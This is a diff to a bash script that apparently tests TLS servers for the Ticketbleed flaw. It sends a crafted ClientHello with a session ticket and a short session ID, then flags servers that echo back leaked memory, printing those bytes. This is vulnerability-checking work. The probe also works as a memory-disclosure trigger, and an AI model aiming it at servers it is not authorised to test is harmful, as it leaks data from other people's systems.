@@ -18,7 +18,7 @@ SID="x00,x00,x0B,xAD,xC0,xDE,"               # don't forget the trailing comma
 
 NODE="$1"
 PORT="443"
-TLSV=${2:-01}        # TLS 1.0=x01  1.1=0x02, 1.2=0x3
+TLSV=${2:-01}                                # TLS 1.0=x01  1.1=0x02, 1.2=0x3
 MAXSLEEP=10
 SOCKREPLY=""
 COL_WIDTH=32
@@ -46,22 +46,21 @@ yellow=$(tput setaf 3; tput bold)
 normal=$(tput sgr0)
 
 send_clienthello() {
-     local -i len_ch=222                          # len of clienthello, exlcuding TLS session ticket and SID (record layer), 416 -C2
+     local -i len_ch=216                          # len of clienthello, exlcuding TLS session ticket and SID (record layer)
      local session_tckt_tls="$1"
-     local -i len_ckt_tls="${#1}"
-     local xlen_ckt_tls=""
+     local -i len_tckt_tls="${#1}"
+     local xlen_tckt_tls=""
 
-     len_ckt_tls=$(( len_ckt_tls / 4))
-     xlen_ckt_tls="$(dec2hex $len_ckt_tls)"
+     len_tckt_tls=$(( len_tckt_tls / 4))
+     xlen_tckt_tls="$(dec2hex $len_tckt_tls)"
 
-     local len_handshake_record_layer="$(( SID_LEN + len_ch + len_ckt_tls ))"
+     local len_handshake_record_layer="$(( LEN_SID + len_ch + len_tckt_tls ))"
      local xlen_handshake_record_layer="$(dec2hexB "$len_handshake_record_layer")"
      local len_handshake_ssl_layer="$(( len_handshake_record_layer + 4 ))"
      local xlen_handshake_ssl_layer="$(dec2hexB "$len_handshake_ssl_layer")"
 
-
      if $DEBUG; then
-          echo "len_ckt_tls (hex):             $len_ckt_tls ($xlen_ckt_tls)"
+          echo "len_tckt_tls (hex):            $len_tckt_tls ($xlen_tckt_tls)"
           echo "SID:                           $SID"
           echo "LEN_SID (XLEN_SID)             $LEN_SID ($XLEN_SID)"
           echo "len_handshake_record_layer:    $len_handshake_record_layer ($xlen_handshake_record_layer)"
@@ -72,7 +71,7 @@ send_clienthello() {
      client_hello="
 # TLS header (5 bytes)
      ,x16,               # Content type (x16 for handshake)
-     x03, x03,           # TLS Version
+     x03, x01,           # TLS Version
                          # Length Secure Socket Layer follow:
      $xlen_handshake_ssl_layer,
 # Handshake header
@@ -118,12 +117,12 @@ send_clienthello() {
 # Extension: SessionTicket TLS
      x00, x23,
 # length of SessionTicket TLS
-     x00, $xlen_ckt_tls,
+     x00, $xlen_tckt_tls,
 # Session Ticket
      $session_tckt_tls                       # here we have the comma aleady
 # Extension: Heartbeat
-     x00, x0f, x00, x01, x01
-     "
+     x00, x0f, x00, x01, x01"
+
      msg=$(echo "$client_hello" | sed -e 's/# .*$//g' -e 's/ //g' | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//; /^$/d' | sed 's/,/\\/g' | tr -d '\n')
      socksend "$msg" $TLSV
 }
@@ -225,7 +224,9 @@ parse_hn_port "$1"
 echo
 "$DEBUG" && ( echo )
 echo "##### 1) Connect to determine 1x session ticket TLS"
+# attn! neither here nor in the following client hello we do SNI. Assuming this is a vulnebilty of the TLS implementation
 SESS_TICKET_TLS="$(get_sessticket)"
+[[ "$SESS_TICKET_TLS" == "," ]] && echo -e "${green}OK, not vulnerable${normal}, no session tickets\n" && exit 0
 fd_socket $PORT
 
 "$DEBUG" && ( echo; echo )
@@ -239,9 +240,8 @@ echo
 SOCKREPLY=$(sockread $HELLO_READBYTES)
 
 if "$DEBUG"; then
-     echo "###### ticketbleed reply: "
      echo "============================="
-     echo "$SOCKREPLY" | head -20
+     echo "$SOCKREPLY"
      echo "============================="
 fi
 
@@ -263,7 +263,7 @@ if [[ "${SOCKREPLY:0:2}" == "16" ]]; then
      if grep -q $sid_input <<< "$sid_detected"; then
           echo "${red}VULNERABLE!${normal}"
           echo -n "  (${yellow}Session ID${normal}, ${red}mem returned${normal} --> "
-          echo -n $sid_detected | sed -e "s/$sid_input/${yellow}$sid_input${normal}${red}/g"
+          echo -n "$sid_detected" | sed -e "s/$sid_input/${yellow}$sid_input${normal}${red}/g"
           echo "${normal})"
      else
           echo -n "not expected server reply but likely not vulnerable"
@@ -272,7 +272,7 @@ elif [[ "${SOCKREPLY:0:2}" == "15" ]]; then
      echo -n "TLS Alert ${SOCKREPLY:10:4} (TLS version: ${SOCKREPLY:2:4}) -- "
      echo "${green}OK, not vulnerable${normal}"
 else
-     echo "TLS record "${SOCKREPLY:0:2}" replied"
+     echo "TLS record ${SOCKREPLY:0:2} replied"
      echo -n "Strange server reply, pls report"
 fi
 echo
